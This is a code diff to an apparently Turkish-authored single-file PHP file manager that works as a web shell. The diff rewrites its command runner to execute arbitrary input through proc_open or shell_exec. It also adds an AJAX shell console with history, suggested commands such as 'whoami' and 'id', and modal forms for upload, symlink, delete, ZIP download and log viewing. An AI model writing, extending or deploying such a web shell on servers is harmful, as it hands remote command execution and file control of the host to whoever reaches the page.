@@ -189,7 +189,23 @@ function ZIP($fullPath){ if(!class_exists('ZipArchive')) return false;
     @unlink($tmpZip);
     exit();
 }
-function RUN($cmd, $cwd = null, $timeout = 15){ if($cmd === "" || $cmd === null) { return ["out"=>"", "err"=>"empty command", "code"=>-1, "time"=>0]; } $cwd = $cwd ? $cwd : J(); $output = shell_exec("cd $cwd && $cmd 2>&1"); $exitCode = 0; preg_match('/^.*\n([0-9]+)$/', $output, $matches); if($matches) $exitCode = (int)$matches[1]; return ["out"=>trim($output), "err"=>"", "code"=>$exitCode, "time"=>0]; }
+function RUN($cmd, $cwd = null, $timeout = 15){
+    if($cmd === "" || $cmd === null) return ["out"=>"", "err"=>"empty command", "code"=>-1, "time"=>0];
+    $cwd = ($cwd && is_dir($cwd)) ? $cwd : J();
+    $t0 = microtime(true);
+    if(function_exists('proc_open')){
+        $p = @proc_open($cmd, [0=>['pipe','r'], 1=>['pipe','w'], 2=>['pipe','w']], $pipes, $cwd);
+        if(is_resource($p)){
+            fclose($pipes[0]);
+            $out = stream_get_contents($pipes[1]); fclose($pipes[1]);
+            $err = stream_get_contents($pipes[2]); fclose($pipes[2]);
+            $code = proc_close($p);
+            return ["out"=>trim((string)$out), "err"=>trim((string)$err), "code"=>(int)$code, "time"=>round(microtime(true)-$t0, 3)];
+        }
+    }
+    $output = function_exists('shell_exec') ? (string)@shell_exec("cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1") : "shell disabled";
+    return ["out"=>trim($output), "err"=>"", "code"=>0, "time"=>round(microtime(true)-$t0, 3)];
+}
 function is_ajax(){ return D("ajax") || C("ajax") || (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest'); }
 function fetch_url($url){
     if(function_exists('curl_init')){
@@ -354,141 +370,91 @@ if(C("newfile")){ $ok = R(J(),C("filename")); respond($ok, $ok ? "Create: ".C("f
 if(C("newdir")){ $ok = S(J(),C("dirname")); respond($ok, $ok ? "Create: ".C("dirname") : "Dir exists"); }
 if(C("upload")){ $ok = isset($_FILES["file"]) && T(J(),$_FILES["file"]); respond($ok, $ok ? "Upload: ".$_FILES["file"]["name"] : "Upload Error"); }
 if(C("symlink")){ $ok = SL(J(), C("target"), C("linkname")); respond($ok, $ok ? "Symlink created: ".C("linkname")." \xE2\x86\x92 ".C("target") : "Symlink failed (already exists or not supported)"); }
-$cmdOut = null; if(C("runcmd")){ $cmd = (string)C("cmd"); $cwd = (string)(C("cwd") ?: J()); $timeout= (int)(C("timeout") ?: 15); if($timeout < 1) $timeout = 15; if($timeout > 120) $timeout = 120; $res = RUN($cmd, is_dir($cwd) ? $cwd : J(), $timeout); $cmdOut = $res; }
+$cmdOut = null;
+if(C("runcmd")){
+    $cmd = (string)C("cmd");
+    $cwd = (string)(C("cwd") ?: J());
+    $timeout = max(1, min(120, (int)(C("timeout") ?: 15)));
+    $cmdOut = RUN($cmd, is_dir($cwd) ? $cwd : J(), $timeout);
+    if(is_ajax()) respond(true, "Command executed", ["cmd"=>$cmd, "cwd"=>is_dir($cwd)?$cwd:J(), "res"=>$cmdOut]);
+}
 $ui  = "<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>".render_css()."</head><body><div class='wrap'>";
 $ui .= "<div id='phfm-msg'></div>";
-$ui .= "<div class='card'><div class='grid'>";
-$ui .= F("POST",["text"=>["filename","File Name"],"submit"=>["newfile","Create"]]);
-$ui .= F("POST",["text"=>["dirname","Dir Name"],"submit"=>["newdir","Create"]]);
-$ui .= F("POST",["file"=>"file","submit"=>["upload","Upload"]],"multipart/form-data");
-$ui .= "<form method='POST'>" . csrf_token_field() . E("text", "target", "", "") . E("text", "linkname", "", "") . E("submit", "symlink", "Create Symlink") . "</form>";
-$ui .= "</div></div>";
-$ui .= "<div class='card'><h3>Komut Calistir</h3>";
-$ui .= "<form method='POST'>";
-$ui .= "<input type='text' name='cmd' placeholder='ornek. ls -la' value='".htmlentities((string)C('cmd'))."' style='flex:3;min-width:220px'/>";
-$ui .= "<input type='text' name='cwd' placeholder='calismadizini (bos = mevcut)' value='".htmlentities((string)C('cwd'))."' style='flex:1;min-width:140px'/>";
-$ui .= "<input type='number' name='timeout' min='1' max='120' value='".((int)(C('timeout')?:15))."' style='width:72px;flex:none' title='timeout (sn)'/>";
-$ui .= "<input type='submit' name='runcmd' value='Calistir'/>";
-$ui .= "</form>";
+$ui .= "<div class='card'><div class='row' style='justify-content:space-between;margin-bottom:10px'><h3>Shell Console</h3><div class='row'><span class='muted' style='font-size:12px'>Up/Down: history</span><button type='button' id='phfm-tclr' style='background:#334155;padding:4px 10px;font-size:12px'>Clear</button></div></div>";
+$ui .= "<form method='POST' id='phfm-shell'><input type='text' id='phfm-cmd' name='cmd' autocomplete='off' placeholder='ls -la / whoami / id' value='".htmlentities((string)C('cmd'))."' style='flex:3;min-width:220px'/>";
+$ui .= "<input type='text' name='cwd' placeholder='cwd (empty = current)' value='".htmlentities((string)C('cwd'))."' style='flex:1;min-width:140px'/>";
+$ui .= "<input type='number' name='timeout' min='1' max='120' value='".((int)(C('timeout')?:15))."' style='width:68px;flex:none' title='timeout (s)'/>";
+$ui .= "<input type='submit' name='runcmd' value='Run'/></form>";
+$ui .= "<div id='phfm-term' style='margin-top:10px;display:".($cmdOut!==null?'block':'none').";padding:12px;border:1px solid #334155;border-radius:8px;background:#020617;color:#e2e8f0;font-family:ui-monospace,Consolas,monospace;font-size:12.5px;max-height:320px;overflow:auto'>";
 if($cmdOut !== null){
-    $ui .= "<div style='margin-top:12px;padding:12px;border:1px solid #334155;border-radius:8px;background:#0b1120;color:#ddd'>";
-    $ui .= "<b>Komut:</b> ".htmlentities((string)C('cmd'))."<br>";
-    $ui .= "<b>Dizin:</b> ".htmlentities((string)(C('cwd')?:J()))."<br>";
-    $ui .= "<b>Exit code:</b> ".$cmdOut['code']." &nbsp; <b>Sure:</b> ".$cmdOut['time']."s<br><br>";
-    if($cmdOut['out'] !== ""){ $ui .= "<b>STDOUT:</b><pre style='white-space:pre-wrap;margin:4px 0;color:#4ade80'>".htmlentities($cmdOut['out'])."</pre>"; }
-    if($cmdOut['err'] !== ""){ $ui .= "<b>STDERR:</b><pre style='white-space:pre-wrap;margin:4px 0;color:#f87171'>".htmlentities($cmdOut['err'])."</pre>"; }
-    if($cmdOut['out']==="" && $cmdOut['err']===""){ $ui .= "<i>(cikti yok)</i>"; }
-    $ui .= "</div>";
+    $ui .= "<div><b>$ ".htmlentities((string)C('cmd'))."</b> <span class='muted'>(exit ".$cmdOut['code'].", ".$cmdOut['time']."s)</span></div>";
+    if($cmdOut['out'] !== "") $ui .= "<pre style='margin:6px 0;color:#4ade80;border:none;padding:0;background:transparent'>".htmlentities($cmdOut['out'])."</pre>";
+    if($cmdOut['err'] !== "") $ui .= "<pre style='margin:6px 0;color:#f87171;border:none;padding:0;background:transparent'>".htmlentities($cmdOut['err'])."</pre>";
 }
-$ui .= "</div>";
+$ui .= "</div></div>";
 $ui .= "<div class='nav'>";
-$ui .= H("?path=".urlencode("/"), "[/ Root]");
-$ui .= H("?path=".urlencode(U(J())), "[Directory Up]");
-$ui .= H("?zip=.&path=".urlencode(J()), "[Bu dizini ZIP indir]");
-$ui .= H("?update=1&path=".urlencode(J()), "[Update]");
-$ui .= H("?sysinfo=1&path=".urlencode(J()), "[System Info]");
-$ui .= H("?varlog=1&path=".urlencode(J()), "[Var Logs]");
-$ui .= (stripos(PHP_OS, "WIN")===0?V():"");
-$ui .= "</div>";
-$ui .= "<div id='phfm-sys'></div>";
-$ui .= render_breadcrumb(J());
+$ui .= "<a href='#newfile' data-mform='newfile'>[+ File]</a><a href='#newdir' data-mform='newdir'>[+ Dir]</a><a href='#upload' data-mform='upload'>[Upload]</a><a href='#symlink' data-mform='symlink'>[Symlink]</a>";
+$ui .= H("?path=".urlencode("/"), "[/ Root]").H("?path=".urlencode(U(J())), "[Directory Up]").H("?zip=.&path=".urlencode(J()), "[ZIP]").H("?update=1&path=".urlencode(J()), "[Update]").H("?sysinfo=1&path=".urlencode(J()), "[System Info]").H("?varlog=1&path=".urlencode(J()), "[Var Logs]");
+$ui .= (stripos(PHP_OS, "WIN")===0?V():"")."</div>";
+$ui .= "<div id='phfm-sys'></div>".render_breadcrumb(J());
 $ui .= "<div id='phfm-list'>".(is_dir(J())?W():"<div class='card'><h3>".htmlspecialchars(basename(J()), ENT_QUOTES, 'UTF-8')."</h3><pre>".Q(J())."</pre></div>")."</div>";
 $ui .= "<div id='phfm-modal' class='modal'><div class='modal-box'><div class='modal-hd'><b id='phfm-mt'>Preview</b><button type='button' id='phfm-mc' style='background:#334155;padding:4px 10px'>X</button></div><div id='phfm-mb' class='modal-bd'></div></div></div>";
 $ui .= "<script>
 (function(){
-  var msgBox = document.getElementById('phfm-msg');
-  function showMsg(ok, text){ msgBox.style.display='block'; msgBox.style.background=ok?'#052e16':'#450a0a'; msgBox.style.borderColor=ok?'#22c55e':'#ef4444'; msgBox.style.color='#f8fafc'; msgBox.textContent=text; }
-  function refreshList(){
-    return fetch(location.href, {credentials:'same-origin'}).then(function(r){ return r.text(); }).then(function(html){
-      var doc = new DOMParser().parseFromString(html, 'text/html'), next = doc.getElementById('phfm-list'), cur = document.getElementById('phfm-list');
-      if(next && cur) cur.innerHTML = next.innerHTML;
-    });
-  }
-  var modal = document.getElementById('phfm-modal'), mTitle = document.getElementById('phfm-mt'), mBody = document.getElementById('phfm-mb');
+  var msgBox=document.getElementById('phfm-msg'),modal=document.getElementById('phfm-modal'),mTitle=document.getElementById('phfm-mt'),mBody=document.getElementById('phfm-mb'),term=document.getElementById('phfm-term'),cmdIn=document.getElementById('phfm-cmd'),hist=[],hIdx=0;
+  function esc(s){ return String(s).replace(/[&<>\"']/g,function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;','\"':'&quot;',\"'\":'&#39;'}[c]; }); }
+  function showMsg(ok,text){ msgBox.style.display='block'; msgBox.style.background=ok?'#052e16':'#450a0a'; msgBox.style.borderColor=ok?'#22c55e':'#ef4444'; msgBox.style.color='#f8fafc'; msgBox.textContent=text; }
   function closeModal(){ if(modal) modal.classList.remove('open'); }
-  if(document.getElementById('phfm-mc')) document.getElementById('phfm-mc').onclick = closeModal;
-  if(modal) modal.onclick = function(e){ if(e.target === modal) closeModal(); };
-  document.addEventListener('keydown', function(e){ if(e.key === 'Escape') closeModal(); });
-  document.addEventListener('click', function(e){
-    var prv = e.target.closest('a[href*=\"?preview=\"]');
-    if(prv){
-      e.preventDefault();
-      fetch(prv.href + '&ajax=1', {headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'same-origin'})
-        .then(function(r){ return r.json(); })
-        .then(function(res){
-          if(res.ok && modal){ mTitle.textContent = res.msg; mBody.innerHTML = res.html; modal.classList.add('open'); }
-          else showMsg(false, res.msg || 'Önizleme açılamadı');
-        })
-        .catch(function(){ showMsg(false, 'Önizleme alınamadı'); });
-      return;
-    }
-    var dsz = e.target.closest('a[href*=\"?dirsize=\"]');
-    if(dsz){
-      e.preventDefault();
-      var td = dsz.closest('td');
-      dsz.textContent = '...';
-      fetch(dsz.href + '&ajax=1', {headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'same-origin'})
-        .then(function(r){ return r.json(); })
-        .then(function(res){ if(res.ok && td){ td.textContent = res.msg; td.className = 'muted'; } else showMsg(false, res.msg || 'Hesaplanamadı'); })
-        .catch(function(){ dsz.textContent = 'Calc'; showMsg(false, 'Boyut hesaplanamadı'); });
-      return;
-    }
-    var pnl = e.target.closest('a[href*=\"?sysinfo=\"],a[href*=\"?varlog=\"]');
-    if(pnl){
-      e.preventDefault();
-      var box = document.getElementById('phfm-sys');
-      if(box && box.innerHTML !== '' && box.getAttribute('data-src') === pnl.href){ box.innerHTML = ''; return; }
-      fetch(pnl.href + (pnl.href.indexOf('?') === -1 ? '?' : '&') + 'ajax=1', {headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'same-origin'})
-        .then(function(r){ return r.json(); })
-        .then(function(res){ if(res.ok && res.html && box){ box.setAttribute('data-src', pnl.href); box.innerHTML = res.html; } else showMsg(false, res.msg || 'Hata'); })
-        .catch(function(){ showMsg(false, 'Veri alınamadı'); });
-      return;
-    }
-    var upd = e.target.closest('a[href*=\"?update=\"]');
-    if(upd){
-      e.preventDefault();
-      if(!confirm('GitHub üzerinden güncellensin mi?')) return;
-      var uUrl = upd.href + (upd.href.indexOf('?') === -1 ? '?' : '&') + 'ajax=1';
-      fetch(uUrl, {headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'same-origin'})
-        .then(function(r){ return r.json(); })
-        .then(function(res){
-          showMsg(res.ok, res.msg);
-          if(res.ok && res.msg.indexOf('Updated') === 0) setTimeout(function(){ location.reload(); }, 1000);
-        })
-        .catch(function(){ showMsg(false, 'Güncelleme isteği başarısız'); });
-      return;
-    }
-    var a = e.target.closest('a[href*=\"?delete=\"]');
-    if(!a) return;
-    e.preventDefault();
-    if(!confirm('Silmek istediğinize emin misiniz?')) return;
-    var url = a.href + (a.href.indexOf('?') === -1 ? '?' : '&') + 'ajax=1';
-    fetch(url, {headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'same-origin'})
-      .then(function(r){ return r.json(); })
-      .then(function(res){
-        showMsg(res.ok, res.msg);
-        if(res.ok){
-          var tr = a.closest('tr');
-          if(tr) tr.remove();
-        }
-      })
-      .catch(function(){ showMsg(false, 'İstek başarısız'); });
+  function openModal(title,html){ if(modal){ mTitle.textContent=title; mBody.innerHTML=html; modal.classList.add('open'); } }
+  function refreshList(){ return fetch(location.href,{credentials:'same-origin'}).then(function(r){return r.text();}).then(function(html){ var doc=new DOMParser().parseFromString(html,'text/html'),n=doc.getElementById('phfm-list'),c=document.getElementById('phfm-list'); if(n&&c) c.innerHTML=n.innerHTML; }); }
+  var mForms={
+    newfile:{t:'Create File',h:".json_encode(F("POST",["text"=>["filename","","flex:1"],"submit"=>["newfile","Create"]]))."},
+    newdir:{t:'Create Directory',h:".json_encode(F("POST",["text"=>["dirname","","flex:1"],"submit"=>["newdir","Create"]]))."},
+    upload:{t:'Upload File',h:".json_encode(F("POST",["file"=>"file","submit"=>["upload","Upload"]],"multipart/form-data"))."},
+    symlink:{t:'Create Symlink',h:".json_encode("<form method='POST'>".csrf_token_field().E("text","target","","").E("text","linkname","","").E("submit","symlink","Create Symlink")."</form>")."}
+  };
+  if(document.getElementById('phfm-mc')) document.getElementById('phfm-mc').onclick=closeModal;
+  if(document.getElementById('phfm-tclr')) document.getElementById('phfm-tclr').onclick=function(){ term.innerHTML=''; term.style.display='none'; };
+  if(modal) modal.onclick=function(e){ if(e.target===modal) closeModal(); };
+  document.addEventListener('keydown',function(e){ if(e.key==='Escape') closeModal(); });
+  if(cmdIn) cmdIn.addEventListener('keydown',function(e){
+    if(e.key==='ArrowUp'&&hIdx>0){ e.preventDefault(); cmdIn.value=hist[--hIdx]; }
+    else if(e.key==='ArrowDown'){ e.preventDefault(); cmdIn.value=hIdx<hist.length-1?hist[++hIdx]:(hIdx=hist.length,''); }
   });
-  document.addEventListener('submit', function(e){
-    var form = e.target;
-    if(!form || form.querySelector('input[name=\"cmd\"]')) return;
-    e.preventDefault();
-    var fd = new FormData(form);
-    var sub = e.submitter || form.querySelector('input[type=\"submit\"],button[type=\"submit\"]');
-    if(sub && sub.name && !fd.has(sub.name)) fd.append(sub.name, sub.value || '1');
-    fd.append('ajax', '1');
-    fetch(location.href, {method:'POST', body:fd, headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'same-origin'})
-      .then(function(r){ return r.json(); })
-      .then(function(res){
-        showMsg(res.ok, res.msg);
-        if(res.ok) refreshList();
-      })
-      .catch(function(){ showMsg(false, 'İstek başarısız'); });
+  document.addEventListener('click',function(e){
+    var mf=e.target.closest('a[data-mform]');
+    if(mf){ e.preventDefault(); var cfg=mForms[mf.getAttribute('data-mform')]; if(cfg){ openModal(cfg.t,cfg.h); var inp=mBody.querySelector('input:not([type=hidden])'); if(inp) inp.focus(); } return; }
+    var prv=e.target.closest('a[href*=\"?preview=\"]');
+    if(prv){ e.preventDefault(); fetch(prv.href+'&ajax=1',{headers:{'X-Requested-With':'XMLHttpRequest'},credentials:'same-origin'}).then(function(r){return r.json();}).then(function(res){ if(res.ok) openModal(res.msg,res.html); else showMsg(false,res.msg||'Önizleme açılamadı'); }).catch(function(){ showMsg(false,'Önizleme alınamadı'); }); return; }
+    var dsz=e.target.closest('a[href*=\"?dirsize=\"]');
+    if(dsz){ e.preventDefault(); var td=dsz.closest('td'); dsz.textContent='...'; fetch(dsz.href+'&ajax=1',{headers:{'X-Requested-With':'XMLHttpRequest'},credentials:'same-origin'}).then(function(r){return r.json();}).then(function(res){ if(res.ok&&td){ td.textContent=res.msg; td.className='muted'; } else showMsg(false,res.msg||'Hesaplanamadı'); }).catch(function(){ dsz.textContent='Calc'; showMsg(false,'Boyut hesaplanamadı'); }); return; }
+    var pnl=e.target.closest('a[href*=\"?sysinfo=\"],a[href*=\"?varlog=\"]');
+    if(pnl){ e.preventDefault(); var box=document.getElementById('phfm-sys'); if(box&&box.innerHTML!==''&&box.getAttribute('data-src')===pnl.href){ box.innerHTML=''; return; } fetch(pnl.href+(pnl.href.indexOf('?')===-1?'?':'&')+'ajax=1',{headers:{'X-Requested-With':'XMLHttpRequest'},credentials:'same-origin'}).then(function(r){return r.json();}).then(function(res){ if(res.ok&&res.html&&box){ box.setAttribute('data-src',pnl.href); box.innerHTML=res.html; } else showMsg(false,res.msg||'Hata'); }).catch(function(){ showMsg(false,'Veri alınamadı'); }); return; }
+    var upd=e.target.closest('a[href*=\"?update=\"]');
+    if(upd){ e.preventDefault(); if(!confirm('GitHub üzerinden güncellensin mi?')) return; fetch(upd.href+(upd.href.indexOf('?')===-1?'?':'&')+'ajax=1',{headers:{'X-Requested-With':'XMLHttpRequest'},credentials:'same-origin'}).then(function(r){return r.json();}).then(function(res){ showMsg(res.ok,res.msg); if(res.ok&&res.msg.indexOf('Updated')===0) setTimeout(function(){location.reload();},1000); }).catch(function(){ showMsg(false,'Güncelleme isteği başarısız'); }); return; }
+    var a=e.target.closest('a[href*=\"?delete=\"]');
+    if(!a) return; e.preventDefault(); if(!confirm('Silmek istediğinize emin misiniz?')) return;
+    fetch(a.href+(a.href.indexOf('?')===-1?'?':'&')+'ajax=1',{headers:{'X-Requested-With':'XMLHttpRequest'},credentials:'same-origin'}).then(function(r){return r.json();}).then(function(res){ showMsg(res.ok,res.msg); if(res.ok){ var tr=a.closest('tr'); if(tr) tr.remove(); } }).catch(function(){ showMsg(false,'İstek başarısız'); });
+  });
+  document.addEventListener('submit',function(e){
+    var form=e.target; if(!form) return;
+    if(form.id==='phfm-shell'){
+      e.preventDefault(); var fd=new FormData(form); fd.append('runcmd','Run'); fd.append('ajax','1');
+      var cval=cmdIn.value.trim(); if(cval&&(hist.length===0||hist[hist.length-1]!==cval)){ hist.push(cval); hIdx=hist.length; }
+      fetch(location.href,{method:'POST',body:fd,headers:{'X-Requested-With':'XMLHttpRequest'},credentials:'same-origin'}).then(function(r){return r.json();}).then(function(res){
+        if(!res.ok||!res.res){ showMsg(false,res.msg||'Komut hatası'); return; }
+        var r=res.res; term.style.display='block';
+        var blk='<div style=\"margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid #1e293b\"><div><b>$ '+esc(res.cmd)+'</b> <span class=\"muted\">('+esc(res.cwd)+' | exit '+r.code+' | '+r.time+'s)</span></div>';
+        if(r.out) blk+='<pre style=\"margin:4px 0;color:#4ade80;border:none;padding:0;background:transparent\">'+esc(r.out)+'</pre>';
+        if(r.err) blk+='<pre style=\"margin:4px 0;color:#f87171;border:none;padding:0;background:transparent\">'+esc(r.err)+'</pre>';
+        if(!r.out&&!r.err) blk+='<div class=\"muted\">(no output)</div>';
+        term.innerHTML+=blk+'</div>'; term.scrollTop=term.scrollHeight; cmdIn.value='';
+      }).catch(function(){ showMsg(false,'Komut çalıştırılamadı'); });
+      return;
+    }
+    e.preventDefault(); var fd=new FormData(form),sub=e.submitter||form.querySelector('input[type=\"submit\"],button[type=\"submit\"]');
+    if(sub&&sub.name&&!fd.has(sub.name)) fd.append(sub.name,sub.value||'1'); fd.append('ajax','1');
+    fetch(location.href,{method:'POST',body:fd,headers:{'X-Requested-With':'XMLHttpRequest'},credentials:'same-origin'}).then(function(r){return r.json();}).then(function(res){ showMsg(res.ok,res.msg); if(res.ok){ closeModal(); refreshList(); } }).catch(function(){ showMsg(false,'İstek başarısız'); });
   });
 })();
 </script>";
